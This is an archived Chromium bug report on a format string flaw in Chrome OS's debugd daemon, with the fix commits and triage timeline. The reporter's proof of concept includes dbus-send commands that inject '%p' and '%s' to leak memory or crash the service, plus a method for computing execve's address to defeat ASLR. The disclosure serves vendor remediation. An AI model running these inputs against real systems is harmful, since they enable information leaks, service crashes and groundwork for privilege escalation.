# Security: Format String Vulnerability in Chrome OS

| Field | Value |
|-------|-------|
| **Issue ID** | [40085058](https://issues.chromium.org/issues/40085058) |
| **Status** | Assigned |
| **Severity** | Unknown |
| **Priority** | P2 |
| **Component** | Internals |
| **Platforms** | ChromeOS |
| **Reporter** | [Deleted User] |
| **Assignee** | ri...@chromium.org |
| **Created** | 2016-08-09 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Note: Although Google engages GDS for security penetration testing services  

periodically, the following vulnerability was discovered by GDS' research team,  

independent of any paid contract with Google.

I have found a format string and ASLR pointer leaking vulnerability in Chrome  

OS' debugd dbus daemon, used for various debugging purposes including crosh.  

By default, the vulnerability requires access to the dbus messaging bus, either  

via the developer mode functionality or another exploit. With such access it  

may be possible to escalate privileges to root, via a buffer overflow in the  

same process, or via a FORTIFY\_SOURCE bypass.

The vulnerability lies in the org.chromium.debugd.PingStop functionality, and  

is exploitable using variations on the following command:

dbus-send --reply-timeout=30000 --system --print-reply --fixed --dest=org.chromium.debugd /org/chromium/debugd org.chromium.debugd.PingStop string:"%p"

Combinations of format strings can be used to leak internal memory of the  

application, but due to the presence of FORTIFY\_SOURCE, I was unable to exploit  

this to gain arbitrary code execution, as protections on the %n format string  

was enabled.

The following proof of concept shows that a low privileged user, such as the  

debugd user, is able to leak system memory to find the location of function  

calls, such as execve, removing ASLR protections. I found that all users on the  

system had permissions to call this endpoint.

First we crash (via the %s format string) and restart the daemon to ensure that  

a new randomized layout is present:

chronos@localhost / $ sudo su -  

localhost ~ # minijail0 -v -u debugd -g debugd -- /bin/bash  

debugd@localhost ~ $ pidof debugd  

20020  

debugd@localhost ~ $ dbus-send --reply-timeout=30000 --system --print-reply --fixed --dest=org.chromium.debugd /org/chromium/debugd org.chromium.debugd.PingStop string:"%s"  

Error org.freedesktop.DBus.Error.NoReply: Message did not receive a reply (timeout by message bus)  

debugd@localhost ~ $ pidof debugd  

20041

Now we use the format string exploit to leak a pointer, rather than crashing,  

from the debugd binary. This is done with the type agnostic %p format string:

debugd@localhost ~ $ dbus-send --reply-timeout=30000 --system --print-reply --fixed --dest=org.chromium.debugd /org/chromium/debugd org.chromium.debugd.PingStop string:"%p %p %p %p %p"  

Error org.chromium.debugd.error.NoSuchProcess: 0x1 0x7f8 (nil) (nil) 0x7f518974c954

Using this leaked pointer (the last value printed) and a previously calculated  

constant offset we can predict the address of the execve function:

debugd@localhost ~ $ python

> > > hex(0x7f518974c954 - 0x5d36c4)  
> > > 
> > > '0x7f5189179290'

The constant value was found by using gdb to calculate the difference between  

the leaked address and the execve function. This difference was constant across  

multiple ASLR layouts.

Using gdb as root we can now verify that this calculated address is the true  

address of the execve function:

localhost ~ # gdb -q -p 20041  

Attaching to process 20041  

[SNIPPED FOR CLARITY]  

(gdb) print execve  

$1 = {<text variable, no debug info>} 0x7f5189179290 <execve>

The source of the vulnerability seems to be in the dbus error message response.  

When sending a format string of "%s", the following output can be observed in  

gdb:

Program received signal SIGSEGV, Segmentation fault.  

0x00007f3369fba705 in vfprintf () from target:/lib64/libc.so.6  

(gdb) bt  

#0 0x00007f3369fba705 in vfprintf () from target:/lib64/libc.so.6  

#1 0x00007f336a074492 in \_\_vsnprintf\_chk () from target:/lib64/libc.so.6  

#2 0x00007f3369f57d20 in \_dbus\_printf\_string\_upper\_bound () from target:/usr/lib64/libdbus-1.so.3  

#3 0x00007f336b0c22a8 in ?? ()  

#4 0x0000000000000000 in ?? ()  

(gdb) x/i $rip  

=> 0x7f3369fba705 <vfprintf+21813>: repnz scas %es:(%rdi),%al  

(gdb) i r  

rax 0x0 0  

rbx 0x7fff7a38a9e0 140735243921888  

rcx 0xffffffffffffffff -1  

rdx 0x20 32  

rsi 0x7fff7a38a520 140735243920672  

rdi 0x1 1  

rbp 0x7fff7a38a9c0 0x7fff7a38a9c0  

rsp 0x7fff7a38a400 0x7fff7a38a400  

r8 0x1 1  

r9 0x7fff7a38a550 140735243920720  

r10 0xffffffff 4294967295  

r11 0x7f336a0ebec0 139858799410880  

r12 0x0 0  

r13 0x7fff7a38ab68 140735243922280  

r14 0x7f336b0c22a8 139858816017064  

r15 0x7f3369fb7653 139858798147155  

rip 0x7f3369fba705 0x7f3369fba705 <vfprintf+21813>  

eflags 0x10286 [ PF SF IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

fs 0x0 0  

gs 0x0 0

With access to the code (from <https://chromium.googlesource.com/chromiumos/platform2/>),  

I was able to locate the source of the issue:

When the Stop function (used by PingStop) is unable to find the process id  

specified by the attacker (i.e the format string), it attempts to set the error  

code using error->set.

platform2/debugd/src/subprocess\_tool.cc:38:  

void SubprocessTool::Stop(const std::string& handle, DBus::Error\* error) {  

if (processes\_.count(handle) != 1) {  

error->set(kErrorNoSuchProcess, handle.c\_str());  

return;  

}

This data is eventually passed to dbus\_set\_error (dbus/dbus/dbus-errors.c:354),  

which attempts to create the string using the supplied data as a format string.  

This can be seen by creating a breakpoint on dbus\_set\_error and sending a dbus  

message. Note that the x86\_64 calling convention for functions starts with the  

rdi, rsi, rdx, rcx registers, and the function definition for dbus\_set\_error is  

dbus\_set\_error(DBusError \*error, const char \*name, const char \*format, ...).  

The following gdb output show that the format is specified as the attacker  

controlled data ("%p" in this case), but no va\_args are specified. The value  

pointed to by rsi matches with the error name seen by the attacker when the  

program does not crash.

(gdb) b dbus\_set\_error  

Breakpoint 1 at 0x7feb49fac000  

(gdb) c  

Continuing.

Breakpoint 1, 0x00007feb49fac000 in dbus\_set\_error () from target:/usr/lib64/libdbus-1.so.3  

(gdb) i r  

rax 0x0 0  

rbx 0x7ffcbd7f17a0 140723487709088  

rcx 0x1 1  

rdx 0x7feb4c3622a8 140648572658344  

rsi 0x7feb4af8ab60 140648551852896  

rdi 0x7feb4c35dff0 140648572641264  

rbp 0x7ffcbd7f1710 0x7ffcbd7f1710  

rsp 0x7ffcbd7f1688 0x7ffcbd7f1688  

r8 0x7f8 2040  

r9 0x0 0  

r10 0x32 50  

r11 0x7feb4a15eec0 140648536993472  

r12 0x7ffcbd7f1750 140723487709008  

r13 0x7ffcbd7f1970 140723487709552  

r14 0x7feb4c361620 140648572655136  

r15 0x7feb4c361610 140648572655120  

rip 0x7feb49fac000 0x7feb49fac000 <dbus\_set\_error>  

eflags 0x246 [ PF ZF IF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

fs 0x0 0  

gs 0x0 0  

(gdb) x/s $rsi  

0x7feb4af8ab60: "org.chromium.debugd.error.NoSuchProcess"  

(gdb) x/s $rdx  

0x7feb4c3622a8: "%p"

Whilst on it’s own this issue is not exploitable, due to the access  

requirements and FORTIFY\_SOURCE’s format string exploit  

mitigations, this vulnerability could be used in combination with other  

exploits to escalate privileges to root (the user of debugd).

**VERSION**  

Toshiba Chromebook 2  

Version 51.0.2704.106 (64-bit)  

Platform 8172.62.0 (Official Build) stable-channel swanky  

Firmware Google\_Swanky.5216.238.5

**REPRODUCTION CASE**  

dbus-send --reply-timeout=30000 --system --print-reply --fixed --dest=org.chromium.debugd /org/chromium/debugd org.chromium.debugd.PingStop string:"%s"

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: Service  

Crash State:  

Program received signal SIGSEGV, Segmentation fault.  

0x00007f3369fba705 in vfprintf () from target:/lib64/libc.so.6  

(gdb) bt  

#0 0x00007f3369fba705 in vfprintf () from target:/lib64/libc.so.6  

#1 0x00007f336a074492 in \_\_vsnprintf\_chk () from target:/lib64/libc.so.6  

#2 0x00007f3369f57d20 in \_dbus\_printf\_string\_upper\_bound () from target:/usr/lib64/libdbus-1.so.3  

#3 0x00007f336b0c22a8 in ?? ()  

#4 0x0000000000000000 in ?? ()  

(gdb) x/i $rip  

=> 0x7f3369fba705 <vfprintf+21813>: repnz scas %es:(%rdi),%al  

(gdb) i r  

rax 0x0 0  

rbx 0x7fff7a38a9e0 140735243921888  

rcx 0xffffffffffffffff -1  

rdx 0x20 32  

rsi 0x7fff7a38a520 140735243920672  

rdi 0x1 1  

rbp 0x7fff7a38a9c0 0x7fff7a38a9c0  

rsp 0x7fff7a38a400 0x7fff7a38a400  

r8 0x1 1  

r9 0x7fff7a38a550 140735243920720  

r10 0xffffffff 4294967295  

r11 0x7f336a0ebec0 139858799410880  

r12 0x0 0  

r13 0x7fff7a38ab68 140735243922280  

r14 0x7f336b0c22a8 139858816017064  

r15 0x7f3369fb7653 139858798147155  

rip 0x7f3369fba705 0x7f3369fba705 <vfprintf+21813>  

eflags 0x10286 [ PF SF IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

fs 0x0 0  

gs 0x0 0

## Timeline

### oc...@chromium.org (2016-08-09)

rickyz, would you mind helping with triaging this? Tentatively assigning a medium.

[Monorail components: Internals]

### ri...@chromium.org (2016-08-09)

Thanks for the report, looks like this is a bug in dbus-c++ (https://canary-chromium-review.googlesource.com/#/c/367270/).

Upstream looks a little dead (https://sourceforge.net/projects/dbus-cplusplus/), but I see there are other places that seem to use it, like https://github.com/coreos/dbus-cplusplus and various distro packages, so it might be worth reporting this to some more folks.

### bu...@chromium.org (2016-08-10)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/third_party/dbus-cplusplus/+/904f49fd770dd559800523edd91c1226e131655d

commit 904f49fd770dd559800523edd91c1226e131655d
Author: Ricky Zhou <rickyz@chromium.org>
Date: Tue Aug 09 17:34:49 2016

Fix format string bug in DBus::Error.

BUG=chromium:635879
TEST=None.

Change-Id: If3a344b08426bec971943942c548eadbbe16c01c
Reviewed-on: https://chromium-review.googlesource.com/367270
Commit-Ready: Ricky Zhou <rickyz@chromium.org>
Tested-by: Ricky Zhou <rickyz@chromium.org>
Reviewed-by: Jorge Lucangeli Obes <jorgelo@chromium.org>
Reviewed-by: Ricky Zhou <rickyz@chromium.org>

[modify] https://crrev.com/904f49fd770dd559800523edd91c1226e131655d/src/error.cpp


### sh...@chromium.org (2016-08-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-08-10)

[Empty comment from Monorail migration]

### [Deleted User] (2016-08-24)

Hi,

I will not be able to receive emails at this address, and therefore not access this page after the 2nd of September. Could mhopkins@gdssecurity.com please be added to the access list for this issue, should any further contact be required?

Regards,
Rory McNamara

### sh...@chromium.org (2016-08-24)

rickyz: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-08-24)

mhopkins@gdssecurity.com should have access now. Thanks for letting us know.

### ri...@chromium.org (2016-08-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-08-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-26)

[Empty comment from Monorail migration]

### di...@chromium.org (2016-08-26)

[Automated comment] Less than 2 weeks to go before stable on M53, manual review required.

### ke...@chromium.org (2016-09-02)

Approving merge to M53 cros. rickyz@ Please merge this in asap.

### bu...@chromium.org (2016-09-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/third_party/dbus-cplusplus/+/bd223aaaf1f77e70864b66a91a75ceb78e2adc3d

commit bd223aaaf1f77e70864b66a91a75ceb78e2adc3d
Author: Ricky Zhou <rickyz@chromium.org>
Date: Tue Aug 09 17:34:49 2016

Fix format string bug in DBus::Error.

BUG=chromium:635879
TEST=None.

Change-Id: If3a344b08426bec971943942c548eadbbe16c01c
Reviewed-on: https://chromium-review.googlesource.com/367270
Commit-Ready: Ricky Zhou <rickyz@chromium.org>
Tested-by: Ricky Zhou <rickyz@chromium.org>
Reviewed-by: Jorge Lucangeli Obes <jorgelo@chromium.org>
Reviewed-by: Ricky Zhou <rickyz@chromium.org>
(cherry picked from commit 904f49fd770dd559800523edd91c1226e131655d)
Reviewed-on: https://chromium-review.googlesource.com/380450
Commit-Queue: Ricky Zhou <rickyz@chromium.org>

[modify] https://crrev.com/bd223aaaf1f77e70864b66a91a75ceb78e2adc3d/src/error.cpp


### aw...@chromium.org (2016-09-08)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-09-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/third_party/dbus-cplusplus/+/3fa293f114225635561c59086f2a990556645000

commit 3fa293f114225635561c59086f2a990556645000
Author: Ricky Zhou <rickyz@chromium.org>
Date: Tue Aug 09 17:34:49 2016

Fix format string bug in DBus::Error.

BUG=chromium:635879
TEST=None.

Change-Id: If3a344b08426bec971943942c548eadbbe16c01c
Reviewed-on: https://chromium-review.googlesource.com/367270
Commit-Ready: Ricky Zhou <rickyz@chromium.org>
Tested-by: Ricky Zhou <rickyz@chromium.org>
Reviewed-by: Jorge Lucangeli Obes <jorgelo@chromium.org>
Reviewed-by: Ricky Zhou <rickyz@chromium.org>
(cherry picked from commit 904f49fd770dd559800523edd91c1226e131655d)
Reviewed-on: https://chromium-review.googlesource.com/380450
Commit-Queue: Ricky Zhou <rickyz@chromium.org>
(cherry picked from commit bd223aaaf1f77e70864b66a91a75ceb78e2adc3d)
Reviewed-on: https://chromium-review.googlesource.com/387129
Reviewed-by: Nathan Bullock <nathanbullock@google.com>
Reviewed-by: Christopher Book <cbook@chromium.org>
Commit-Queue: Hisham Yehia <hyehia@google.com>
Tested-by: Hisham Yehia <hyehia@google.com>

[modify] https://crrev.com/3fa293f114225635561c59086f2a990556645000/src/error.cpp


### aw...@chromium.org (2016-10-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-04)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-10)

[Empty comment from Monorail migration]

### [Deleted User] (2016-10-13)

Further to https://crbug.com/chromium/635879#c6, can you add the original reporter of this issue back with a new email address - rory@rorym.cnamara.com

### ri...@chromium.org (2016-10-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dc...@google.com (2017-01-21)

[Empty comment from Monorail migration]

### dc...@google.com (2017-03-04)

[Empty comment from Monorail migration]

### dc...@google.com (2017-04-17)

[Empty comment from Monorail migration]

### dc...@google.com (2017-05-30)

[Empty comment from Monorail migration]

### dc...@chromium.org (2017-08-01)

[Empty comment from Monorail migration]

### dc...@chromium.org (2017-10-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/635879?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085058)*
